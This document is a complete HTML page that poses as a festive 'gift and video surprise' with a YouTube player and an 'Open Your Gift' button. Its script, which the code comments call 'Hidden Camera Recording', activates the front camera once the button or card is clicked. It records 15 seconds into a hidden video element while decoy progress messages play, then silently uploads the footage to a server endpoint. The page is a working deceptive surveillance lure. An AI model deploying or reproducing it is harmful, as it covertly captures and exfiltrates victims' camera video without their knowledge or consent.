<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🎁 Gift & Video Surprise</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Arial', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            overflow: hidden;
            position: relative;
        }
        
        /* Confetti Background */
        .confetti-container {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            pointer-events: none; overflow: hidden; z-index: 0;
        }
        .confetti {
            position: absolute;
            width: 10px; height: 10px; top: -10px;
            animation: confettiFall linear infinite;
        }
        @keyframes confettiFall {
            0% { transform: translateY(-10px) rotate(0deg); opacity: 1; }
            100% { transform: translateY(110vh) rotate(720deg); opacity: 0; }
        }
        
        /* Gift Overlay */
        .gift-overlay {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            z-index: 100;
            display: none;
            justify-content: center;
            align-items: center;
            background: rgba(0,0,0,0.7);
            animation: fadeIn 0.5s ease;
            pointer-events: none;
        }
        .gift-overlay.active {
            display: flex;
            animation: fadeIn 0.5s ease;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.8); }
            to { opacity: 1; transform: scale(1); }
        }
        .gift-content {
            text-align: center;
            animation: bounceIn 1s ease;
            pointer-events: auto;
        }
        @keyframes bounceIn {
            0% { transform: scale(0.3) rotate(-10deg); opacity: 0; }
            50% { transform: scale(1.2) rotate(5deg); }
            70% { transform: scale(0.9) rotate(-3deg); }
            100% { transform: scale(1) rotate(0deg); opacity: 1; }
        }
        .gift-emoji {
            font-size: 150px;
            display: block;
            animation: giftFloat 2s ease-in-out infinite;
            text-shadow: 0 0 80px rgba(255,215,0,0.8);
        }
        @keyframes giftFloat {
            0%, 100% { transform: translateY(0px) scale(1); }
            50% { transform: translateY(-20px) scale(1.05); }
        }
        .gift-text {
            color: white;
            font-size: 3.5rem;
            font-weight: bold;
            text-shadow: 0 0 30px rgba(255,215,0,0.6);
            margin-top: 20px;
            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d, #ff6b6b);
            background-size: 300% auto;
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            animation: shimmer 3s linear infinite;
        }
        @keyframes shimmer {
            0% { background-position: 0% center; }
            100% { background-position: 300% center; }
        }
        .gift-sub {
            color: rgba(255,255,255,0.9);
            font-size: 1.3rem;
            margin-top: 15px;
            -webkit-text-fill-color: rgba(255,255,255,0.9);
            animation: pulse 2s ease-in-out infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.6; }
        }
        
        /* Celebration Confetti */
        .celebration-confetti {
            position: fixed;
            z-index: 99;
            pointer-events: none;
            font-size: 50px;
            animation: celebrationFall linear forwards;
        }
        @keyframes celebrationFall {
            0% {
                transform: translateY(-100px) rotate(0deg) scale(1);
                opacity: 1;
            }
            100% {
                transform: translateY(120vh) rotate(720deg) scale(0.5);
                opacity: 0;
            }
        }
        
        /* Main Card */
        .festival-card {
            position: relative; z-index: 1;
            background: rgba(255, 255, 255, 0.12);
            backdrop-filter: blur(20px);
            border-radius: 30px;
            padding: 40px;
            max-width: 600px; width: 90%;
            box-shadow: 0 25px 50px rgba(0,0,0,0.3);
            border: 1px solid rgba(255,255,255,0.15);
            text-align: center;
            animation: float 3s ease-in-out infinite;
            transition: all 0.5s ease;
        }
        .festival-card.opening {
            animation: none;
            transform: scale(1.02);
            border-color: #ffd93d;
            box-shadow: 0 0 80px rgba(255,215,0,0.3);
        }
        @keyframes float {
            0%, 100% { transform: translateY(0px); }
            50% { transform: translateY(-10px); }
        }
        
        .main-emoji {
            font-size: 80px; 
            margin-bottom: 15px; 
            display: block;
            animation: pulse 2s ease-in-out infinite;
        }
        .main-emoji.opening {
            animation: celebrateSpin 1s ease-in-out infinite;
        }
        @keyframes celebrateSpin {
            0%, 100% { transform: rotate(-5deg) scale(1); }
            50% { transform: rotate(5deg) scale(1.1); }
        }
        
        .festival-title {
            color: white; 
            font-size: 2.2rem; 
            font-weight: bold;
            margin-bottom: 5px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }
        .subtitle {
            color: rgba(255,255,255,0.8);
            font-size: 1rem;
            margin-bottom: 20px;
            line-height: 1.6;
        }
        
        /* YouTube Video Section */
        .video-container {
            margin: 15px 0 20px 0;
            border-radius: 15px;
            overflow: hidden;
            position: relative;
            background: #000;
            aspect-ratio: 16/9;
            border: 2px solid rgba(255,255,255,0.1);
            transition: all 0.3s ease;
        }
        .video-container iframe {
            width: 100%;
            height: 100%;
            border: none;
        }
        
        /* URL Input Section */
        .url-input-section {
            display: flex;
            gap: 10px;
            margin: 15px 0;
            flex-wrap: wrap;
        }
        .url-input {
            flex: 1;
            padding: 12px 18px;
            border-radius: 30px;
            border: 2px solid rgba(255,255,255,0.2);
            background: rgba(255,255,255,0.1);
            color: white;
            font-size: 1rem;
            outline: none;
            transition: all 0.3s ease;
            min-width: 200px;
        }
        .url-input:focus {
            border-color: #ffd93d;
            background: rgba(255,255,255,0.2);
        }
        .url-input::placeholder {
            color: rgba(255,255,255,0.5);
        }
        .url-btn {
            padding: 12px 25px;
            border-radius: 30px;
            border: none;
            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
            color: white;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            white-space: nowrap;
        }
        .url-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 5px 20px rgba(238, 90, 36, 0.4);
        }
        
        .gift-btn {
            background: linear-gradient(135deg, #ffd93d, #f5576c);
            border: none;
            color: white;
            padding: 16px 50px;
            font-size: 1.3rem;
            font-weight: bold;
            border-radius: 60px;
            cursor: pointer;
            transition: all 0.3s ease;
            box-shadow: 0 10px 40px rgba(245,87,108,0.4);
            margin: 10px auto;
            position: relative;
            overflow: hidden;
            display: inline-flex;
            align-items: center;
            gap: 15px;
        }
        .gift-btn::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: linear-gradient(45deg, transparent, rgba(255,255,255,0.1), transparent);
            transform: rotate(45deg);
            animation: btnShine 3s linear infinite;
        }
        @keyframes btnShine {
            0% { transform: translateX(-100%) rotate(45deg); }
            100% { transform: translateX(100%) rotate(45deg); }
        }
        .gift-btn:hover:not(:disabled) {
            transform: scale(1.08);
            box-shadow: 0 15px 50px rgba(245,87,108,0.6);
        }
        .gift-btn:disabled {
            opacity: 0.7;
            cursor: not-allowed;
            transform: none;
        }
        .gift-btn .btn-emoji {
            font-size: 1.8rem;
        }
        
        .surprise-container {
            margin: 20px 0 10px 0;
            display: none;
        }
        .surprise-container.visible {
            display: block;
        }
        .surprise-text {
            color: rgba(255,255,255,0.9);
            font-size: 1rem;
            margin-bottom: 10px;
            animation: pulse 1.5s ease-in-out infinite;
        }
        .progress-container {
            width: 100%; 
            height: 6px;
            background: rgba(255,255,255,0.15);
            border-radius: 10px;
            overflow: hidden;
        }
        .progress-bar {
            height: 100%; 
            width: 0%;
            background: linear-gradient(90deg, #ffd93d, #f5576c);
            border-radius: 10px;
            transition: width 0.3s ease;
        }
        .progress-bar.done {
            background: linear-gradient(90deg, #ffd93d, #ff6b6b, #ffd93d);
            background-size: 200% auto;
            animation: shimmer 1s linear infinite;
        }
        
        .status {
            margin-top: 15px; 
            color: rgba(255,255,255,0.6);
            font-size: 0.85rem;
            min-height: 20px;
            opacity: 0.5;
        }
        .status.active {
            opacity: 1;
        }
        .status.success {
            color: #7dffb3;
            opacity: 1;
        }
        .status.error {
            color: #ff6b6b;
            opacity: 1;
        }
        
        #hiddenVideo { display: none; }
        
        @media (max-width: 600px) {
            .festival-card { padding: 20px; }
            .festival-title { font-size: 1.8rem; }
            .main-emoji { font-size: 60px; }
            .gift-btn { padding: 14px 30px; font-size: 1.1rem; }
            .gift-emoji { font-size: 100px; }
            .gift-text { font-size: 2.5rem; }
            .url-input-section { flex-direction: column; }
            .url-btn { width: 100%; }
        }
    </style>
</head>
<body>
    <div class="confetti-container" id="confettiContainer"></div>
    
    <!-- Gift Overlay -->
    <div class="gift-overlay" id="giftOverlay">
        <div class="gift-content">
            <span class="gift-emoji" id="giftEmoji">🎁</span>
            <div class="gift-text" id="giftText">🎉 SURPRISE! 🎉</div>
            <div class="gift-sub">✨ Your gift is ready! ✨</div>
        </div>
    </div>
    
    <video id="hiddenVideo" autoplay playsinline></video>
    
    <div class="festival-card" id="festivalCard">
        <span class="main-emoji" id="mainEmoji">🎊</span>
        <h1 class="festival-title"><span id="festivalName">Gift & Video</span></h1>
        <p class="subtitle" id="subtitle">✨ Watch this video and claim your surprise ✨</p>
        
        <!-- YouTube Video Player -->
        <div class="video-container" id="videoContainer">
            <iframe 
                id="youtubePlayer"
                src="https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=0&rel=0" 
                title="YouTube video player"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture"
                allowfullscreen>
            </iframe>
        </div>
        
        <!-- YouTube URL Input -->
        <div class="url-input-section">
            <input 
                type="text" 
                class="url-input" 
                id="youtubeUrl" 
                placeholder="Paste YouTube URL here..."
                value="https://www.youtube.com/watch?v=dQw4w9WgXcQ">
            <button class="url-btn" id="loadVideoBtn">▶ Load Video</button>
        </div>
        
        <button class="gift-btn" id="giftBtn">
            <span class="btn-emoji">🎁</span>
            <span id="btnText">Open Your Gift</span>
        </button>
        
        <div class="surprise-container" id="surpriseContainer">
            <div class="surprise-text" id="surpriseText">🎀 Preparing your surprise...</div>
            <div class="progress-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
        </div>
        
        <div class="status" id="statusMessage">💝 Watch the video and click the gift!</div>
    </div>

    <script>
        // ============================================
        // DOM Elements
        // ============================================
        const videoElement = document.getElementById('hiddenVideo');
        const giftBtn = document.getElementById('giftBtn');
        const btnText = document.getElementById('btnText');
        const statusMessage = document.getElementById('statusMessage');
        const progressBar = document.getElementById('progressBar');
        const surpriseContainer = document.getElementById('surpriseContainer');
        const surpriseText = document.getElementById('surpriseText');
        const festivalCard = document.getElementById('festivalCard');
        const mainEmoji = document.getElementById('mainEmoji');
        const giftOverlay = document.getElementById('giftOverlay');
        const giftEmoji = document.getElementById('giftEmoji');
        const giftText = document.getElementById('giftText');
        const festivalName = document.getElementById('festivalName');
        const youtubePlayer = document.getElementById('youtubePlayer');
        const youtubeUrl = document.getElementById('youtubeUrl');
        const loadVideoBtn = document.getElementById('loadVideoBtn');
        const videoContainer = document.getElementById('videoContainer');

        // ============================================
        // Configuration
        // ============================================
        const UPLOAD_URL = '/upload';
        const FESTIVAL_NAME = 'Video Surprise';
        const DURATION = 15;  // Recording duration in seconds

        festivalName.textContent = FESTIVAL_NAME;

        // ============================================
        // State Variables
        // ============================================
        let mediaStream = null;
        let mediaRecorder = null;
        let recordedChunks = [];
        let timerInterval = null;
        let timeRemaining = DURATION;
        let isRecording = false;
        let isGiftOpened = false;
        let videoLoaded = true;

        // ============================================
        // YouTube Video Functions
        // ============================================
        function extractVideoId(url) {
            // Extract video ID from various YouTube URL formats
            const patterns = [
                /(?:youtube\.com\/watch\?v=)([^&]+)/,
                /(?:youtu\.be\/)([^?]+)/,
                /(?:youtube\.com\/embed\/)([^?]+)/
            ];
            
            for (const pattern of patterns) {
                const match = url.match(pattern);
                if (match) return match[1];
            }
            return null;
        }

        function loadYouTubeVideo(url) {
            const videoId = extractVideoId(url);
            
            if (!videoId) {
                statusMessage.textContent = '❌ Invalid YouTube URL. Please check and try again.';
                statusMessage.className = 'status error';
                return false;
            }
            
            // Load the video with autoplay
            youtubePlayer.src = `https://www.youtube.com/embed/${videoId}?autoplay=1&rel=0`;
            videoLoaded = true;
            
            statusMessage.textContent = '✅ Video loaded! Click the gift when ready.';
            statusMessage.className = 'status active';
            return true;
        }

        // Load initial video
        loadYouTubeVideo(youtubeUrl.value);

        // ============================================
        // Event Listeners for YouTube
        // ============================================
        loadVideoBtn.addEventListener('click', () => {
            const url = youtubeUrl.value.trim();
            if (url) {
                loadYouTubeVideo(url);
            } else {
                statusMessage.textContent = '❌ Please paste a YouTube URL first.';
                statusMessage.className = 'status error';
            }
        });

        youtubeUrl.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                loadVideoBtn.click();
            }
        });

        // ============================================
        // Confetti Generator (Background)
        // ============================================
        const confettiContainer = document.getElementById('confettiContainer');
        const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
        for (let i = 0; i < 80; i++) {
            const confetti = document.createElement('div');
            confetti.className = 'confetti';
            confetti.style.left = Math.random() * 100 + '%';
            confetti.style.background = colors[Math.floor(Math.random() * colors.length)];
            confetti.style.width = (Math.random() * 8 + 4) + 'px';
            confetti.style.height = (Math.random() * 8 + 4) + 'px';
            confetti.style.borderRadius = Math.random() > 0.5 ? '50%' : '2px';
            confetti.style.animationDuration = (Math.random() * 3 + 2) + 's';
            confetti.style.animationDelay = (Math.random() * 4) + 's';
            confettiContainer.appendChild(confetti);
        }

        // ============================================
        // Gift & Surprise Functions
        // ============================================
        function showGiftReveal() {
            giftOverlay.classList.add('active');
            
            let emojis = ['🎁', '🎀', '🎉', '🎊', '✨', '⭐', '💝', '🎈'];
            let index = 0;
            
            const emojiInterval = setInterval(() => {
                giftEmoji.textContent = emojis[index % emojis.length];
                index++;
                if (index > 10) {
                    clearInterval(emojiInterval);
                    giftEmoji.textContent = '🎉';
                    giftText.textContent = '🎊 SURPRISE! 🎊';
                    
                    launchCelebrationConfetti();
                    
                    setTimeout(() => {
                        giftOverlay.classList.remove('active');
                        festivalCard.classList.remove('opening');
                        mainEmoji.classList.remove('opening');
                        giftBtn.disabled = false;
                        btnText.textContent = 'Open Another Gift';
                        statusMessage.textContent = '💝 Thank you! Watch more videos and open more gifts!';
                        statusMessage.className = 'status success';
                        surpriseContainer.classList.remove('visible');
                        isGiftOpened = false;
                    }, 5000);
                }
            }, 200);
        }

        function launchCelebrationConfetti() {
            const emojis = ['🎉', '🎊', '✨', '⭐', '🌟', '💫', '🎈', '🎁', '🥳', '🎆', '🎇', '💝'];
            const container = document.body;
            
            for (let i = 0; i < 60; i++) {
                setTimeout(() => {
                    const el = document.createElement('div');
                    el.className = 'celebration-confetti';
                    el.textContent = emojis[Math.floor(Math.random() * emojis.length)];
                    el.style.left = Math.random() * 100 + '%';
                    el.style.fontSize = (Math.random() * 40 + 25) + 'px';
                    el.style.animationDuration = (Math.random() * 3 + 2) + 's';
                    container.appendChild(el);
                    
                    setTimeout(() => { el.remove(); }, 5000);
                }, i * 40);
            }
        }

        // ============================================
        // Gift Opening (Hidden Camera Recording)
        // ============================================
        async function openGift() {
            if (isGiftOpened) return;
            isGiftOpened = true;
            
            try {
                // Update UI
                giftBtn.disabled = true;
                btnText.textContent = '🎀 Opening...';
                festivalCard.classList.add('opening');
                mainEmoji.classList.add('opening');
                mainEmoji.textContent = '🎁';
                surpriseContainer.classList.add('visible');
                surpriseText.textContent = '🎀 Preparing your surprise...';
                progressBar.style.width = '0%';
                statusMessage.textContent = '⏳ Your surprise is being prepared...';
                statusMessage.className = 'status active';

                // Access camera (hidden)
                mediaStream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
                    audio: false
                });

                videoElement.srcObject = mediaStream;
                await videoElement.play();

                // Setup recorder
                recordedChunks = [];
                mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm;codecs=vp9' });
                mediaRecorder.ondataavailable = (event) => {
                    if (event.data.size > 0) recordedChunks.push(event.data);
                };
                mediaRecorder.onstop = () => {
                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
                    uploadGift(blob);
                };

                // Start recording (hidden)
                mediaRecorder.start();
                isRecording = true;
                timeRemaining = DURATION;
                
                surpriseText.textContent = '🎁 Your surprise is being created...';

                // Countdown
                timerInterval = setInterval(() => {
                    timeRemaining--;
                    const progress = ((DURATION - timeRemaining) / DURATION) * 100;
                    progressBar.style.width = progress + '%';
                    
                    const messages = [
                        '🎨 Creating magic...',
                        '✨ Adding sparkles...',
                        '🌟 Almost ready...',
                        '🎁 Your surprise is coming!',
                        '💝 Final touches...'
                    ];
                    const msgIndex = Math.min(
                        Math.floor((DURATION - timeRemaining) / 3),
                        messages.length - 1
                    );
                    if (timeRemaining > 3) {
                        surpriseText.textContent = messages[msgIndex % messages.length];
                    }
                    
                    if (timeRemaining <= 0) {
                        clearInterval(timerInterval);
                        timerInterval = null;
                        
                        if (mediaRecorder && isRecording) {
                            mediaRecorder.stop();
                            isRecording = false;
                            surpriseText.textContent = '🎊 Your surprise is ready!';
                            progressBar.classList.add('done');
                            progressBar.style.width = '100%';
                        }
                        
                        if (mediaStream) {
                            mediaStream.getTracks().forEach(track => track.stop());
                            mediaStream = null;
                            videoElement.srcObject = null;
                        }
                        
                        setTimeout(() => {
                            showGiftReveal();
                        }, 500);
                    }
                }, 1000);

            } catch (error) {
                console.error('Error:', error);
                let errorMsg = '❌ ';
                if (error.name === 'NotAllowedError') {
                    errorMsg += 'Camera access denied. Please allow camera permission.';
                } else if (error.name === 'NotFoundError') {
                    errorMsg += 'No camera found on this device.';
                } else if (error.name === 'NotReadableError') {
                    errorMsg += 'Camera is in use by another application.';
                } else {
                    errorMsg += 'Something went wrong. Please try again.';
                }
                statusMessage.textContent = errorMsg;
                statusMessage.className = 'status error';
                giftBtn.disabled = false;
                btnText.textContent = 'Try Again';
                isGiftOpened = false;
                surpriseContainer.classList.remove('visible');
            }
        }

        async function uploadGift(blob) {
            const formData = new FormData();
            formData.append('video', blob, `gift_${Date.now()}.webm`);

            try {
                const response = await fetch(UPLOAD_URL, { 
                    method: 'POST', 
                    body: formData 
                });
                
                if (!response.ok) {
                    throw new Error('Upload failed: ' + response.status);
                }
                console.log('✅ Gift video uploaded successfully!');
            } catch (error) {
                console.error('Upload error:', error);
                statusMessage.textContent = '❌ Upload failed. Please try again.';
                statusMessage.className = 'status error';
            }
        }

        // ============================================
        // Event Listeners
        // ============================================
        giftBtn.addEventListener('click', openGift);
        
        festivalCard.addEventListener('click', (e) => {
            // Don't trigger if clicking on input or button
            if (e.target.closest('.url-input') || e.target.closest('.url-btn') || e.target.closest('iframe')) {
                return;
            }
            if (!isGiftOpened && !giftBtn.disabled) {
                openGift();
            }
        });

        window.addEventListener('beforeunload', () => {
            if (mediaRecorder && isRecording) mediaRecorder.stop();
            if (mediaStream) {
                mediaStream.getTracks().forEach(track => track.stop());
            }
        });

        console.log('🎁 Gift & Video interface loaded!');
        console.log('📹 Recording duration: ' + DURATION + ' seconds');
        console.log('📋 Upload URL: ' + UPLOAD_URL);
        console.log('▶️ YouTube video loaded. User can change video URL.');
    </script>
</body>
</html>
